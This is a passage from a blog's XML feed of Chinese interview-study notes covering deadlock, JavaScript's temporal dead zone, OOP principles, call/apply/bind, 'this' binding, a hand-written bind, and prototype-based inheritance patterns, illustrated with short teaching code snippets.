color="#FF8C00">死锁是指两个或两个以上的进程在执行过程中，由于竞争资源而造成阻塞的现象，若无外力作用，它们都将无法继续执行</font></p><p><strong>产生原因</strong></p><ul><li>竞争资源引起进程死锁</li><li>可剥夺和非剥夺资源</li><li>竞争非剥夺资源</li><li>竞争临时性资源</li><li>进程推进顺序不当</li><li></li></ul><p><strong>产生条件</strong></p><ol><li>互斥条件：涉及的资源是非共享的<ul><li>涉及的资源是非共享的,一段时间内某资源只由一个进程占用,如果此时还有其它进程请求资源，则请求者只能等待，直至占有资源的进程用毕释放</li></ul></li><li>不剥夺条件：不能强行剥夺进程拥有的资源<ul><li>进程已获得的资源，在未使用完之前，不能被剥夺，只能在使用完时由自己释放</li></ul></li><li>请求和保持条件：进程在等待一新资源时继续占有已分配的资源<ul><li>指进程已经保持至少一个资源，但又提出了新的资源请求，而该资源已被其它进程占有，此时请求进程阻塞，但又对自己已获得的其它资源保持不放</li></ul></li><li>环路等待条件：存在一种进程的循环链，链中的每一个进程已获得的资源同时被链中的下一个进程所请求 在发生死锁时，必然存在一个进程——资源的环形链</li></ol><p><font color="#FF00FF">解决办法</font><br>只要打破四个必要条件之一就能有效预防死锁的发生</p><h1 id="暂时性死区"><a href="#暂时性死区" class="headerlink" title="暂时性死区"></a>暂时性死区</h1><p>暂时性死区的本质就是，<font color="#FF00FF">只要一进入当前作用域，所要使用的变量就已经存在了，但是不可获取，只有等到声明变量的那一行代码出现，才可以获取和使用该变量</font>。<br><strong>扩展：</strong><br>let 、const与暂时性死区</p><p>let或const声明的变量拥有暂时性死区（TDZ）：当进入它的作用域，它不能被访问（获取或设置）直到执行到达声明。</p><p>首先看看<font color="#FF8C00">不具有</font>暂时性死区的var：</p><ul><li>当进入var变量的作用域（包围它的函数）<strong>，立即为它创建（绑定）存储空间。变量会立即<font color="#FF00FF">被初始化并赋值</font>为undefined。</strong></li><li>当执行到变量声明的时候，如果变量定义了值则会被赋值。</li></ul><p>通过let声明的变量拥有暂时性死区，生命周期如下：</p><ul><li>当进入let变量的作用域（包围它的语法块），立即为它创建（绑定）存储空间。此时变量仍是<font color="#FF00FF">未初始化</font>的。</li><li>获取或设置未初始化的变量将抛出异常ReferenceError。</li><li>当执行到变量声明的时候，如果变量定义了值则会被赋值。如果没有定义值，则赋值为undefined。</li><li>const工作方式与let类似，但是**<font color="#FF8C00">定义的时候必须赋值并且不能改变。</font>**</li></ul><blockquote><p>在 TDZ 内部，如果获取或设置变量将抛出异常：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if (true) &#123; // enter new scope, TDZ starts</span><br><span class="line">    // Uninitialized binding for `tmp` is created</span><br><span class="line"></span><br><span class="line">    tmp = &#x27;abc&#x27;; // ReferenceError</span><br><span class="line">    console.log(tmp); // ReferenceError</span><br><span class="line"></span><br><span class="line">    let tmp; // TDZ ends, `tmp` is initialized with `undefined`</span><br><span class="line">    console.log(tmp); // undefined</span><br><span class="line"></span><br><span class="line">    tmp = 123;</span><br><span class="line">    console.log(tmp); // 123</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面的示例将演示死区（dead zone）是<font color="#FF00FF">真正短暂的（基于时间）和不受空间条件限制（基于位置）</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if (true) &#123; // enter new scope, TDZ starts</span><br><span class="line">    const func = function () &#123;</span><br><span class="line">        console.log(myVar); // OK!</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    // Here we are within the TDZ and</span><br><span class="line">    // accessing `myVar` would cause a `ReferenceError`</span><br><span class="line"></span><br><span class="line">    let myVar = 3; // TDZ ends</span><br><span class="line">    func(); // called outside TDZ</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>typeof与暂时性死区，变量在暂时性死区无法被访问，所以无法对它使用typeof：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (true) &#123;</span><br><span class="line">    console.log(typeof tmp); // ReferenceError</span><br><span class="line">    let tmp;</span><br><span class="line">&#125;s</span><br></pre></td></tr></table></figure><h1 id="面向对象的三个特征，分别说一下什么意思"><a href="#面向对象的三个特征，分别说一下什么意思" class="headerlink" title="面向对象的三个特征，分别说一下什么意思"></a>面向对象的三个特征，分别说一下什么意思</h1><p><strong>封装：</strong> 将对象运行所需的资源封装在程序对象中——基本上，是方法和数据。对象是“公布其接口”。其他附加到这些接口上的对象不需要关心对象实现的方法即可使用这个对象。这个概念就是“不要告诉我你是怎么做的，只要做就可以了。”对象可以看作是一个自我包含的原子。<font color="#FF8C00">对象接口包括了公共的方法和初始化数据。</font></p><p><strong>继承：</strong> 继承可以解决代码复用，让编程更加靠近人类思维。当多个类存在相同的属性(变量)和方法时，可以从这些类中抽象出父类，在父类中定义这些相同的属性和方法，所有的子类不需要重新定义这些属性和方法，只需要通过继承父类中的属性和方法。</p><p><strong>多态：</strong> 多态是指一个引用(类型)在不同情况下的多种状态。也可以理解成：<font color="#FF00FF">多态是指通过指向父类的引用，来调用在不同子类中实现的方法</font>。</p><p><font color="#FF8C00">特点：</font></p><ul><li>封装可以隐藏实现细节，使得代码模块化；</li><li>继承可以扩展已存在的代码模块（类），它们的目的都是为了——代码重用。</li><li>多态就是<font color="#FF00FF">相同的事物，调用其相同的方法，参数也相同时，但表现的行为却不同。多态分为两种，一种是行为多态与对象的多态</font></li></ul>]]></content>
      
      
      <categories>
          
          <category> plan </category>
          
      </categories>
      
      
        <tags>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> plan </tag>
            
            <tag> daily/weekly </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>上下文this相关内容</title>
      <link href="/2022/08/03/%E4%B8%8A%E4%B8%8B%E6%96%87this%E7%9B%B8%E5%85%B3%E5%86%85%E5%AE%B9(%E7%AC%AC%E5%9B%9B%E5%A4%A9)/"/>
      <url>/2022/08/03/%E4%B8%8A%E4%B8%8B%E6%96%87this%E7%9B%B8%E5%85%B3%E5%86%85%E5%AE%B9(%E7%AC%AC%E5%9B%9B%E5%A4%A9)/</url>
      
        <content type="html"><![CDATA[<h1 id="call-appy-bind的作用和区别"><a href="#call-appy-bind的作用和区别" class="headerlink" title="call appy bind的作用和区别"></a>call appy bind的作用和区别</h1><p><strong>作用：</strong><br>都可以改变函数内部的this指向。</p><p><strong>区别点：</strong><br>call 和 apply 会调用函数，并且改变函数内部this指向。<br>call 和 apply 传递的参数不一样，call 传递参数arg1,arg2…形式 apply 必须数组形式[arg]<br>bind 不会调用函数，可以改变函数内部this指向。</p><p><strong>解析：</strong><br>call方法<br>改变函数内部this指向<br>call()方法<font color="#FF00FF">调用一个对象。简单理解为调用函数的方式</font>，但是它可以改变函数的this指向。<br>写法：fun.call(thisArg, arg1, arg3, …) // thisArg为想要指向的对象，arg1,arg3为参数</p><p>call 的主要作用也可以<font color="#FF8C00">实现继承</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function Person(uname, age) &#123;</span><br><span class="line">    this.uname = uname;</span><br><span class="line">    this.age = age;</span><br><span class="line">  &#125;</span><br><span class="line">  function Son(uname, age) &#123;</span><br><span class="line">    Person.call(this, uname, age);</span><br><span class="line">  &#125;</span><br><span class="line">  var son = new Son(&quot;zhang&quot;, 12);</span><br><span class="line">  console.log(son);</span><br></pre></td></tr></table></figure><p>apply方法</p><p>apply()方法调用<font color="#FF00FF">一个函数</font>。简单理解为调用函数的方式，但是它可以改变函数的this指向。<br>写法：fun.apply(thisArg, [argsArray])<br>thisArg:在fun函数运行时指定的this值<br>argsArray:传递的值，必须包含在数组里面<br>返回值就是函数的返回值，因为他就是调用函数<br>apply的主要应用，比如可以利用apply可以求得数组中最大值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">const arr = [1, 22, 3, 44, 5, 66, 7, 88, 9];</span><br><span class="line">const max = Math.max.apply(Math, arr);</span><br><span class="line">console.log(max);</span><br></pre></td></tr></table></figure><p>bind方法</p><p>bind()方法<font color="#FF00FF">不会调用函数</font>，但是能改变函数内部this指向<br>写法：fun.bind(thisArg, arg1, arg2, …)</p><p>thisArg:<font color="#FF8C00">在fun函数运行时指定的this值</font><br>arg1,arg2:传递的其他参数<br><font color="#FF00FF">返回由指定的this值和初始化参数改造的原函数拷贝</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var o = &#123;</span><br><span class="line">    name: &quot;lisa&quot;</span><br><span class="line">&#125;;</span><br><span class="line">function fn() &#123;</span><br><span class="line">    console.log(this);</span><br><span class="line">&#125;</span><br><span class="line">var f = fn.bind(o);</span><br><span class="line">f();</span><br></pre></td></tr></table></figure><p>如果有的函数我们不需要立即调用，但是<font color="#FF00FF">又需要改变这个函数的this指向</font>，此时用bind再合适不过了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">const btns = document.querySelectorAll(&quot;button&quot;);</span><br><span class="line">for (let i = 0; i &lt; btns.length; i++) &#123;</span><br><span class="line">    btns[i].onclick = function() &#123;</span><br><span class="line">      this.disabled = true;</span><br><span class="line">      setTimeout(</span><br><span class="line">        function() &#123;</span><br><span class="line">          this.disabled = false;</span><br><span class="line">        &#125;.bind(this),</span><br><span class="line">        2000</span><br><span class="line">      );</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>主要应用场景</strong>：<br>call 经常做继承。<br>apply 经常跟数组有关系，比如借助于数学对象实现数组最大值最小值。<br>bind 不调用函数，但是还想改变this指向，比如改变定时器内部的this指向。</p><h1 id="this指向（普通函数、箭头函数）"><a href="#this指向（普通函数、箭头函数）" class="headerlink" title="this指向（普通函数、箭头函数）"></a>this指向（普通函数、箭头函数）</h1><h2 id="普通函数中的this"><a href="#普通函数中的this" class="headerlink" title="普通函数中的this"></a>普通函数中的this</h2><p>谁调用了函数或者方法，那么这个函数或者对象中的this就指向谁</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">let getThis = function () &#123;</span><br><span class="line">    console.log(this);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let obj=&#123;</span><br><span class="line">    name:&quot;Jack&quot;,</span><br><span class="line">    getThis:function()&#123;</span><br><span class="line">        console.log(this);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//getThis()方法是由window在全局作用域中调用的，所以this指向调用该方法的对象，即window</span><br><span class="line">getThis();//window</span><br><span class="line">//此处的getThis()方法是obj这个对象调用的，所以this指向obj</span><br><span class="line">obj.getThis();//obj</span><br></pre></td></tr></table></figure><h2 id="匿名函数中的this"><a href="#匿名函数中的this" class="headerlink" title="匿名函数中的this"></a>匿名函数中的this</h2><p>匿名函数的执行<font color="#FF8C00">具有全局性，则匿名函数中的this指向是window，而不是调用该匿名函数的对象</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">let obj = &#123;</span><br><span class="line">    getThis: function () &#123;</span><br><span class="line">        return function () &#123; //匿名函数</span><br><span class="line">            console.log(this);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">obj.getThis()(); //window</span><br></pre></td></tr></table></figure><p>上面代码中，getThi()方法是由obj调用，但是obj.getThis()返回的是一个匿名函数，而匿名函数中的this指向window，所以打印出window。 如<font color="#FF00FF">果想在上述代码中使this指向调用该方法的对象，可以提前把this传值给另外一个变量(_this或者that)</font>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">let obj = &#123;</span><br><span class="line">     getThis: function () &#123;</span><br><span class="line">     //提前保存this指向</span><br><span class="line">         let _this=this</span><br><span class="line">         return function () &#123;</span><br><span class="line">             console.log(_this);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> obj.getThis()(); //obj</span><br></pre></td></tr></table></figure><h2 id="箭头函数中的this"><a href="#箭头函数中的this" class="headerlink" title="箭头函数中的this"></a>箭头函数中的this</h2><ol><li>箭头函数中的this是<font color="#FF00FF">在函数定义的时候就确定下来的</font>，而不是在函数调用的时候确定的；</li><li>箭头函数中的<font color="#FF00FF">this指向父级作用域的执行上下文</font>；（技巧：<font color="#FF8C00">因为javascript中除了全局作用域，其他作用域都是由函数创建出来的，所以如果想确定this的指向，则找到离箭头函数最近的function，与该function平级的执行上下文中的this即是箭头函数中的this</font>）</li><li><font color="#FF00FF">箭头函数无法使用apply、call和bind方法改变this指向，因为其this值在函数定义的时候就被确定下来</font>。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">let obj = &#123;</span><br><span class="line">    【this】//此处的this即是箭头函数中的this</span><br><span class="line">    getThis: function () &#123;</span><br><span class="line">        return  ()=&gt; &#123;</span><br><span class="line">            console.log(this);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">obj.getThis()(); //obj</span><br></pre></td></tr></table></figure><p>首先，距离箭头函数最近的是getThis(){}，与该函数平级的执行上下文是obj中的执行上下文，箭头函数中的this就是下注释代码处的this，即obj。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> //代码中有两个箭头函数，由于找不到对应的function，所以this会指向window对象。</span><br><span class="line">let obj = &#123;</span><br><span class="line">     getThis: ()=&gt; &#123;</span><br><span class="line">         return  ()=&gt; &#123;</span><br><span class="line">             console.log(this);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> obj.getThis()(); //window</span><br></pre></td></tr></table></figure><p>该段代码中存在两个箭头函数，this找不到对应的function(){}，所以一直往上找直到指向window</p><h2 id="手写bind【TODO】"><a href="#手写bind【TODO】" class="headerlink" title="手写bind【TODO】"></a>手写bind【TODO】</h2><ol><li>Function.prototype.bind,这样就可以让所有函数的隐式原型上都会有一个bind了。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Function.prototype.bind = function() &#123;</span><br><span class="line">    // TODO</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>bind的第一个形参是要绑定给函数的上下文，所以再完善一下上面的代码</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Function.prototype.bind = function(context) &#123;</span><br><span class="line">    var fn = this;</span><br><span class="line">    return function() &#123;</span><br><span class="line">        return fn.apply(context);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>真正的bind函数是可以传递多个参数的，第一个参数是要绑定给调用它的函数的上下文，其他的参数将会作为预设参数传递给这个函数，如下所示</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">let foo = function()&#123;</span><br><span class="line">    console.log(arguments);</span><br><span class="line">&#125;</span><br><span class="line">foo.bind(null,&quot;a&quot;,&quot;b&quot;)(&quot;c&quot;,&quot;d&quot;,&quot;e&quot;); // &#123;&quot;1&quot;:&quot;a&quot;,&quot;2&quot;:&quot;b&quot;,&quot;3&quot;:&quot;c&quot;,&quot;4&quot;:&quot;d&quot;,&quot;5&quot;:&quot;e&quot;&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>为了实现上面的效果，我们发现只要在返回的值上将函数合并上去就行了</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Function.prototype.bind = function(context, ...args) &#123;</span><br><span class="line">    var fn = this;</span><br><span class="line">    return function(...rest) &#123;</span><br><span class="line">        return fn.apply(context,[...args, ...rest]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="5"><li>为了兼容性，替换成ES5的写法</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Function.prototype.bind = function() &#123;</span><br><span class="line">    var args = Array.prototype.slice.call(arguments);</span><br><span class="line">    var context = args.splice(0,1)[0];</span><br><span class="line">    var fn = this;</span><br><span class="line">    return function() &#123;</span><br><span class="line">        let rest = Array.prototype.slice.call(arguments);</span><br><span class="line">        return fn.apply(context, args.concat(rest));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="6"><li>把函数的原型保留下来。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Function.prototype.bind = function() &#123;</span><br><span class="line">    var args = Array.prototype.slice.call(arguments);</span><br><span class="line">    var context = args.splice(0,1)[0];</span><br><span class="line">    var fn = this;</span><br><span class="line">    var res =  function() &#123;</span><br><span class="line">        let rest = Array.prototype.slice.call(arguments);</span><br><span class="line">        return fn.apply(context, args.concat(rest));</span><br><span class="line">    &#125;</span><br><span class="line">    if(this.prototype) &#123;</span><br><span class="line">        res.prototype = this.prototype;</span><br><span class="line">    &#125;</span><br><span class="line">    return res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="7"><li>最后还需要再找到一种方法来判断是否对bind之后的结果使用了new操作符。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Function.prototype.bind = function() &#123;</span><br><span class="line">    var args = Array.prototype.slice.call(arguments);</span><br><span class="line">    var context = args.splice(0,1)[0];</span><br><span class="line">    var fn = this;</span><br><span class="line">    var noop = function() &#123;&#125;</span><br><span class="line">    var res =  function() &#123;</span><br><span class="line">        let rest = Array.prototype.slice.call(arguments);</span><br><span class="line">        // this只和运行的时候有关系，所以这里的this和上面的fn不是一码事，new res()和res()在调用的时            候，res中的this是不同的东西</span><br><span class="line">        return fn.apply(this instanceof noop ? this : context, args.concat(rest));</span><br><span class="line">    &#125;</span><br><span class="line">    if(this.prototype) &#123;</span><br><span class="line">        noop.prototype = this.prototype;</span><br><span class="line">    &#125;</span><br><span class="line">    res.prototype = new noop();</span><br><span class="line">    return res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>箭头函数能否当构造函数</li></ol><p>箭头函数表达式的语法比函数表达式更简洁，并且没有自己的<font color="#FF8C00">this，arguments，super或new.target</font>。箭头函数表达式更适用于那些本来需要匿名函数的地方，并且它<font color="#FF8C00">不能用作构造函数。</font></p><ol start="5"><li>继承，优缺点</li></ol><p>继承的好处<br>a：提高了代码的复用性<br>b：提高了代码的维护性<br>c：让类与类之间产生了关系，是多态的前提<br>继承的弊端<br>a：类的耦合性增强了,但是开发的原则：高内聚，低耦合。<br>6. js继承的方法和优缺点</p><p><strong>原型链继承</strong><br>实现方式：将子类的原型链指向父类的对象实例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function Parent()&#123;</span><br><span class="line">  this.name = &quot;parent&quot;;</span><br><span class="line">  this.list = [&#x27;a&#x27;];</span><br><span class="line">&#125;</span><br><span class="line">Parent.prototype.sayHi = function()&#123;</span><br><span class="line">  console.log(&#x27;hi&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">function Child()&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">Child.prototype = new Parent();</span><br><span class="line">var child = new Child();</span><br><span class="line">console.log(child.name);</span><br><span class="line">child.sayHi();</span><br></pre></td></tr></table></figure><p>原理：子类实例child的__proto__指向Child的原型链prototype，而Child.prototype指向Parent类的对象实例，该父类对象实例的__proto__指向Parent.prototype,所以Child可继承Parent的构造函数属性、方法和原型链属性、方法</p><p>优点：可继承构造函数的属性，父类构造函数的属性，父类原型的属性<br>缺点：<font color="#FF8C00">无法向父类构造函数传参</font>；且所有实例共享父类实例的属性，若父类共有属性为引用类型，一个子类实例更改父类构造函数共有属性时会导致继承的共有属性发生变化；实例如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var a = new Child();</span><br><span class="line">var b = new Child();</span><br><span class="line">a.list.push(&#x27;b&#x27;);</span><br><span class="line">console.log(b.list); // [&#x27;a&#x27;,&#x27;b&#x27;]</span><br></pre></td></tr></table></figure><p><strong>构造函数继承</strong><br>实现方式：在子类构造函数中使用call或者apply劫持父类构造函数方法，并传入参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function Parent(name, id)&#123;</span><br><span class="line">  this.id = id;</span><br><span class="line">  this.name = name;</span><br><span class="line">  this.printName = function()&#123;</span><br><span class="line">    console.log(this.name);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">Parent.prototype.sayName = function()&#123;</span><br><span class="line">  console.log(this.name);</span><br><span class="line">&#125;;</span><br><span class="line">function Child(name, id)&#123;</span><br><span class="line">  Parent.call(this, name, id);</span><br><span class="line">  // Parent.apply(this, arguments);</span><br><span class="line">&#125;</span><br><span class="line">var child = new Child(&quot;jin&quot;, &quot;1&quot;);</span><br><span class="line">child.printName(); // jin</span><br><span class="line">child.sayName() // Error</span><br></pre></td></tr></table></figure><p>原理：使用call或者apply更改子类函数的作用域，使this执行父类构造函数，子类因此可以继承父类共有属性<br>优点：可解决原型链继承的缺点<br>缺点：不可继承父类的原型链方法，构造函数<font color="#FF8C00">不可复用</font><br><strong>组合继承</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">function Parent(name, id)&#123;</span><br><span class="line">  this.id = id;</span><br><span class="line">  this.name = name;</span><br><span class="line">  this.list = [&#x27;a&#x27;];</span><br><span class="line">  this.printName = function()&#123;</span><br><span class="line">    console.log(this.name);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">Parent.prototype.sayName = function()&#123;</span><br><span class="line">  console.log(this.name);</span><br><span class="line">&#125;;</span><br><span class="line">function Child(name, id)&#123;</span><br><span class="line">  Parent.call(this, name, id);</span><br><span class="line">  // Parent.apply(this, arguments);</span><br><span class="line">&#125;</span><br><span class="line">Child.prototype = new Parent();</span><br><span class="line">var child = new Child(&quot;jin&quot;, &quot;1&quot;);</span><br><span class="line">child.printName(); // jin</span><br><span class="line">child.sayName() // jin</span><br><span class="line"></span><br><span class="line">var a = new Child();</span><br><span class="line">var b = new Child();</span><br><span class="line">a.list.push(&#x27;b&#x27;);</span><br><span class="line">console.log(b.list); // [&#x27;a&#x27;]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>原理：综合使用构造函数继承和原型链继承<br>优点：可继承父类原型上的属性，且可传参；每个新实例引入的构造函数是私有的<br>缺点：<font color="#FF8C00">会执行两次父类的构造函数</font>，消耗较大内存，子类的构造函数会代替原型上的那个父类构造函数<br><strong>原型式继承</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var parent = &#123;</span><br><span class="line">  names: [&#x27;a&#x27;]</span><br><span class="line">&#125;</span><br><span class="line">function copy(object) &#123;</span><br><span class="line">  function F() &#123;&#125;</span><br><span class="line">  F.prototype = object;    </span><br><span class="line">  return new F();</span><br><span class="line">&#125;</span><br><span class="line">var child = copy(parent);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>原理：类似Object.create，用一个函数包装一个对象，然后返回这个函数的调用，这个函数就变成了个可以随意增添属性的实例或对象，结果是将子对象的__proto__指向父对象<br>缺点：<font color="#FF8C00">共享引用类型</font><br><strong>寄生式继承</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function createObject(obj) &#123;</span><br><span class="line">  var o = copy(obj);</span><br><span class="line">  o.getNames = function() &#123;</span><br><span class="line">    console.log(this.names);</span><br><span class="line">    return this.names;</span><br><span class="line">  &#125;</span><br><span class="line">  return o;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>原理：二次封装原型式继承，并拓展<br>优点：可添加新的属性和方法<br><strong>寄生组合式继承</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 